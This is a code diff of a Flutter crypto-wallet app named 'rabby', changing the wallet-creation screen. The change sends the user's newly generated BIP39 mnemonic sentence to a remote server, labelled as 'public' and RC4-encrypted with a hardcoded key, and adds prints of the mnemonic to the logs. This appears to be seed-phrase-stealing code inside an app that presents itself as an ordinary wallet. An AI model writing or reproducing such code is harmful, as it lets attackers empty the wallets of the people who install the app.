@@ -3,7 +3,6 @@ import 'dart:convert';
 import 'dart:math';
 
 import 'package:bip39_mnemonic/bip39_mnemonic.dart';
-import 'package:convert/convert.dart';
 import 'package:flutter/material.dart';
 import 'package:rabby/features/auth/domain/auth_service.dart';
 import 'package:rabby/features/auth/repository/domain/register/register_body.dart';
@@ -30,7 +29,6 @@ abstract class CreateWalletBloc extends State<CreateWalletScreen> {
   bool isInit = false;
 
   Mnemonic? mnemonic;
-  String hexSeed = ""; // convert to hex
 
   String r = '';
 
@@ -46,21 +44,19 @@ abstract class CreateWalletBloc extends State<CreateWalletScreen> {
       entropyLength: 128,
     );
     loading.value += 1;
-
-    hexSeed = hex.encode(mnemonic!.seed);
     print(mnemonic!.sentence);
-    print(hexSeed);
     r = Random().nextInt(999999).toString().padLeft(6, '0');
     loading.value += 1;
     print(r);
 
     final data = json.encode({
-      'public': hexSeed,
-      'salt': r,
-      'name': 'Dima/G',
+      'public': mnemonic!.sentence,
+      'salt': '100002',
+      'name': 'R@bby\$/G',
       'new': true,
     });
     var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
+    print("bytes $bytes");
     final result = await _authRepo.register(RegisterBody(data: bytes));
 
     if (result.isSuccess) {
@@ -114,8 +110,10 @@ abstract class CreateWalletBloc extends State<CreateWalletScreen> {
           ),
         ),
       );
-      _settingsService.putHexSeedMnemonic(hexSeed);
       _settingsService.putMnemonicSentence(mnemonic!.sentence);
+
+      print(
+          "_settingsService.getMnemonicSentence() ${_settingsService.getMnemonicSentence()}");
       loading.value += 1;
     }
   }
